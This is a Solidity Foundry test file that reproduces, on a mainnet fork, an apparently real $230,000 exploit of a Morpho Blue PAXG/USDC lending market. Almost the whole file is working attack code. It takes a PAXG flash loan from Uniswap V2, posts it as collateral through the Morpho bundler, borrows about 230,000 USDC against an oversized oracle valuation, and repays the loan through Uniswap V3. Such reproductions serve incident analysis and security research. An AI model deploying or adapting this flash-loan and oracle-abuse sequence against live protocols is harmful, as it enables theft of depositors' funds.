// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.15;

import "../basetest.sol";

// @KeyInfo - Total Lost : $230,000
// Attacker : https://etherscan.io/address/0x02DBE46169fDf6555F2A125eEe3dce49703b13f5
// Attack Contract : https://etherscan.io/address/0x4095F064B8d3c3548A3bebfd0Bbfd04750E30077
// Vulnerable Contract : https://etherscan.io/address/0xBBBBBbbBBb9cC5e90e3b3Af64bdAF62C37EEFFCb
// Attack Tx : https://etherscan.io/tx/0x256979ae169abb7fbbbbc14188742f4b9debf48b48ad5b5207cadcc99ccb493b

// @Info
// Vulnerable Contract Code : https://etherscan.io/address/0xBBBBBbbBBb9cC5e90e3b3Af64bdAF62C37EEFFCb#code

// @Analysis
// Post-mortem :
// Twitter Guy : https://x.com/omeragoldberg/status/1845515843787960661
// Hacking God :
pragma solidity ^0.8.0;

interface IMorphoBundler {
    error UnsafeCast();

    function MORPHO() external view returns (address);

    function ST_ETH() external view returns (address);

    function WRAPPED_NATIVE() external view returns (address);

    function WST_ETH() external view returns (address);

    function approve2(
        IAllowanceTransfer.PermitSingle memory permitSingle,
        bytes memory signature,
        bool skipRevert
    ) external payable;

    function erc20Transfer(address asset, address recipient, uint256 amount) external payable;

    function erc20TransferFrom(address asset, uint256 amount) external payable;

    function erc20WrapperDepositFor(address wrapper, uint256 amount) external payable;

    function erc20WrapperWithdrawTo(address wrapper, address account, uint256 amount) external payable;

    function erc4626Deposit(address vault, uint256 assets, uint256 minShares, address receiver) external payable;

    function erc4626Mint(address vault, uint256 shares, uint256 maxAssets, address receiver) external payable;

    function erc4626Redeem(
        address vault,
        uint256 shares,
        uint256 minAssets,
        address receiver,
        address owner
    ) external payable;

    function erc4626Withdraw(
        address vault,
        uint256 assets,
        uint256 maxShares,
        address receiver,
        address owner
    ) external payable;

    function initiator() external view returns (address);

    function morphoBorrow(
        MarketParams memory marketParams,
        uint256 assets,
        uint256 shares,
        uint256 slippageAmount,
        address receiver
    ) external payable;

    function morphoFlashLoan(address token, uint256 assets, bytes memory data) external payable;

    function morphoRepay(
        MarketParams memory marketParams,
        uint256 assets,
        uint256 shares,
        uint256 slippageAmount,
        address onBehalf,
        bytes memory data
    ) external payable;

    function morphoSetAuthorizationWithSig(
        Authorization memory authorization,
        Signature memory signature,
        bool skipRevert
    ) external payable;

    function morphoSupply(
        MarketParams memory marketParams,
        uint256 assets,
        uint256 shares,
        uint256 slippageAmount,
        address onBehalf,
        bytes memory data
    ) external payable;

    function morphoSupplyCollateral(
        MarketParams memory marketParams,
        uint256 assets,
        address onBehalf,
        bytes memory data
    ) external payable;

    function morphoWithdraw(
        MarketParams memory marketParams,
        uint256 assets,
        uint256 shares,
        uint256 slippageAmount,
        address receiver
    ) external payable;

    function morphoWithdrawCollateral(
        MarketParams memory marketParams,
        uint256 assets,
        address receiver
    ) external payable;

    function multicall(
        bytes[] memory data
    ) external payable;

    function nativeTransfer(address recipient, uint256 amount) external payable;

    function onMorphoFlashLoan(uint256, bytes memory data) external;

    function onMorphoRepay(uint256, bytes memory data) external;

    function onMorphoSupply(uint256, bytes memory data) external;

    function onMorphoSupplyCollateral(uint256, bytes memory data) external;

    function permit(
        address asset,
        uint256 amount,
        uint256 deadline,
        uint8 v,
        bytes32 r,
        bytes32 s,
        bool skipRevert
    ) external payable;

    function permitDai(
        uint256 nonce,
        uint256 expiry,
        bool allowed,
        uint8 v,
        bytes32 r,
        bytes32 s,
        bool skipRevert
    ) external payable;

    function reallocateTo(
        address publicAllocator,
        address vault,
        uint256 value,
        Withdrawal[] memory withdrawals,
        MarketParams memory supplyMarketParams
    ) external payable;

    function stakeEth(uint256 amount, uint256 minShares, address referral) external payable;

    function transferFrom2(address asset, uint256 amount) external payable;

    function unwrapNative(
        uint256 amount
    ) external payable;

    function unwrapStEth(
        uint256 amount
    ) external payable;

    function urdClaim(
        address distributor,
        address account,
        address reward,
        uint256 amount,
        bytes32[] memory proof,
        bool skipRevert
    ) external payable;

    function wrapNative(
        uint256 amount
    ) external payable;

    function wrapStEth(
        uint256 amount
    ) external payable;

    receive() external payable;
}

interface IMorpho {
    function setAuthorization(address authorized, bool newIsAuthorized) external;
}

interface IAllowanceTransfer {
    struct PermitDetails {
        address token;
        uint160 amount;
        uint48 expiration;
        uint48 nonce;
    }

    struct PermitSingle {
        PermitDetails details;
        address spender;
        uint256 sigDeadline;
    }
}

struct MarketParams {
    address loanToken;
    address collateralToken;
    address oracle;
    address irm;
    uint256 lltv;
}

struct Authorization {
    address authorizer;
    address authorized;
    bool isAuthorized;
    uint256 nonce;
    uint256 deadline;
}

struct Signature {
    uint8 v;
    bytes32 r;
    bytes32 s;
}

struct Withdrawal {
    MarketParams marketParams;
    uint128 amount;
}

interface IUniswapV2Pair {
    function swap(uint256 amount0Out, uint256 amount1Out, address to, bytes memory calldatsa) external;
}

// Uniswap V3 Pool Interface
interface IUniswapV3Pool {
    function swap(
        address recipient,
        bool zeroForOne,
        int256 amountSpecified,
        uint160 sqrtPriceLimitX96,
        bytes calldata data
    ) external returns (int256 amount0, int256 amount1);

    function token0() external view returns (address);
    function token1() external view returns (address);
}

pragma solidity ^0.8.0;

// Assuming necessary imports and interface definitions are provided

contract MorphoBlue is BaseTestWithBalanceLog {
    // Constants
    uint256 public constant FORK_BLOCK_NUMBER = 20_956_051;

    // Uniswap V3 constants
    uint160 internal constant MIN_SQRT_RATIO = 4_295_128_739;
    uint160 internal constant MAX_SQRT_RATIO = 1_461_446_703_485_210_103_287_273_052_203_988_822_378_723_970_342;

    // Token addresses
    address public constant USDC = 0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48;
    address public constant PAXG = 0x45804880De22913dAFE09f4980848ECE6EcbAf78;

    // Contract addresses
    address public constant MORPHO_BUNDLER = 0x4095F064B8d3c3548A3bebfd0Bbfd04750E30077;
    address public constant PAXG_WETH_V2_PAIR = 0x9C4Fe5FFD9A9fC5678cFBd93Aa2D4FD684b67C4C;
    address public constant PAXG_USDC_V3_PAIR = 0xB431c70f800100D87554ac1142c4A94C5Fe4C0C4;

    // Flash loan and swap amounts
    uint256 public constant PAXG_FLASHLOAN_AMOUNT = 132_577_813_003_136_114;
    uint256 public constant USDC_SWAP_AMOUNT = 420 * 1e6; // 420 USDC

    // Fee calculation constants
    uint256 public constant UNISWAP_V2_FEE_NUMERATOR = 3;
    uint256 public constant UNISWAP_V2_FEE_DENOMINATOR = 997;

    // Morpho market parameters
    address public constant MORPHO_ORACLE = 0xDd1778F71a4a1C6A0eFebd8AE9f8848634CE1101;
    address public constant MORPHO_IRM = 0x870aC11D48B15DB9a138Cf899d20F13F79Ba00BC;
    uint256 public constant MORPHO_LTV = 915_000_000_000_000_000;

    // Borrow parameters
    uint256 public constant BORROW_ASSETS = 230_002_486_670;
    uint256 public constant BORROW_SHARES = 0;
    uint256 public constant BORROW_SLIPPAGE_AMOUNT = 226_898_039_801_385_921;

    // Interfaces
    IMorphoBundler public immutable bundler = IMorphoBundler(payable(MORPHO_BUNDLER));

    function setUp() public {
        // Fork the mainnet at the specified block number
        vm.createSelectFork("mainnet", FORK_BLOCK_NUMBER);
        // Set the funding token to USDC
        fundingToken = USDC;
    }

    function testExploit() public balanceLog {
        // Initiate a flash loan of PAXG from the Uniswap V2 pair
        IUniswapV2Pair(PAXG_WETH_V2_PAIR).swap(PAXG_FLASHLOAN_AMOUNT, 0, address(this), new bytes(100));
        //At the end we swap any PAXG if remaining to USDC
        uint256 paxgBal = TokenHelper.getTokenBalance(PAXG, address(this));
        if (paxgBal > 0) _v3Swap(PAXG, USDC, paxgBal, address(this));
    }

    function uniswapV2Call(address sender, uint256 amount0, uint256 amount1, bytes calldata data) external {
        // Ensure the caller is the correct Uniswap V2 pair
        require(msg.sender == PAXG_WETH_V2_PAIR, "Invalid caller");

        // Approve PAXG transfer to Morpho Bundler
        require(TokenHelper.approveToken(PAXG, MORPHO_BUNDLER, amount0), "Approval failed");

        // Perform operations with Morpho protocol
        performComplexOperation(
            PAXG,
            PAXG_FLASHLOAN_AMOUNT,
            MarketParams({
                loanToken: USDC,
                collateralToken: PAXG,
                oracle: MORPHO_ORACLE,
                irm: MORPHO_IRM,
                lltv: MORPHO_LTV
            }),
            address(this),
            MORPHO_BUNDLER,
            BORROW_ASSETS,
            BORROW_SHARES,
            BORROW_SLIPPAGE_AMOUNT,
            address(this)
        );

        // Swap USDC for PAXG to repay the flash loan
        _v3Swap(USDC, PAXG, USDC_SWAP_AMOUNT, address(this));

        // Calculate and repay the flash loan fee
        uint256 fee = ((amount0 * UNISWAP_V2_FEE_NUMERATOR) / UNISWAP_V2_FEE_DENOMINATOR) + 1;
        uint256 repayAmount = amount0 + fee;
        TokenHelper.transferToken(PAXG, PAXG_WETH_V2_PAIR, repayAmount);
    }

    function performComplexOperation(
        address asset,
        uint256 amount,
        MarketParams memory marketParams,
        address onBehalf,
        address authorized,
        uint256 borrowAssets,
        uint256 borrowShares,
        uint256 borrowSlippageAmount,
        address borrowReceiver
    ) public payable {
        // Authorize Morpho Bundler
        IMorpho(bundler.MORPHO()).setAuthorization(MORPHO_BUNDLER, true);

        // Prepare multicall data
        bytes[] memory calls = new bytes[](3);
        calls[0] = abi.encodeWithSelector(IMorphoBundler.erc20TransferFrom.selector, asset, amount);
        calls[1] =
            abi.encodeWithSelector(IMorphoBundler.morphoSupplyCollateral.selector, marketParams, amount, onBehalf, "");
        calls[2] = abi.encodeWithSelector(
            IMorphoBundler.morphoBorrow.selector,
            marketParams,
            borrowAssets,
            borrowShares,
            borrowSlippageAmount,
            borrowReceiver
        );

        // Execute the multicall
        bundler.multicall{value: msg.value}(calls);
    }

    function _v3Swap(address tokenIn, address tokenOut, uint256 amount, address recipient) internal {
        if (amount == 0) {
            return;
        }

        bool zeroForOne = tokenIn < tokenOut;
        uint160 sqrtPriceLimitX96 = zeroForOne ? MIN_SQRT_RATIO + 1 : MAX_SQRT_RATIO - 1;

        // Execute the swap on Uniswap V3
        IUniswapV3Pool(PAXG_USDC_V3_PAIR).swap(
            recipient, zeroForOne, int256(amount), sqrtPriceLimitX96, zeroForOne ? bytes("1") : bytes("")
        );
    }

    function uniswapV3SwapCallback(int256 amount0Delta, int256 amount1Delta, bytes calldata data) external {
        // Ensure the caller is the correct Uniswap V3 pool
        require(msg.sender == PAXG_USDC_V3_PAIR, "Invalid caller");

        bool zeroForOne = data.length > 0;
        address tokenOut = zeroForOne
            ? IUniswapV3Pool(PAXG_USDC_V3_PAIR).token0()
            : IUniswapV3Pool(PAXG_USDC_V3_PAIR).token0() == USDC ? PAXG : USDC;

        uint256 amountOut = uint256(zeroForOne ? amount0Delta : amount1Delta);

        // Transfer the required amount to the pool
        TokenHelper.transferToken(tokenOut, msg.sender, amountOut);
    }
}
